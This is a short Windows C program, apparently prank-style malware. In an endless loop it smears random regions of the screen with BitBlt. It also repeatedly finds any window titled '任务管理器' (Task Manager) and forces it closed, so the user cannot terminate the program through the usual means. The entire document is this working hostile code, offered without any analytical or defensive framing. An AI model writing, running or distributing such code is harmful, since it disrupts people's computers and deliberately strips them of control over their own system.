#define _CRT_SECURE_NO_WARNINGS 1
#include<windows.h>
#include<stdlib.h>
#include<time.h>

int main(void) {
	srand(time(NULL));
	HDC hdc = GetDC(NULL);
	int width = GetSystemMetrics(0);
	int height = GetSystemMetrics(1);
	int x = 0, y = 0, w = 0, h = 0;
	while (1)
	{
		x = rand() % (width * 5 / 4) - width / 4;
		y = rand() % (height * 5 / 4) - height / 4;
		w = rand() % width / 2;
		h = rand() % height / 2;
		BitBlt(hdc, x + rand() % 3 - 1, y + rand() % 4, w, h, hdc, x, y, SRCCOPY);

		HWND hwnd = FindWindow(NULL,L"任务管理器"); 
		if (hwnd != NULL)
			SendMessage(hwnd, WM_SYSCOMMAND, SC_CLOSE, 0);
	}
	ReleaseDC(NULL, hdc);
	return 0;
}
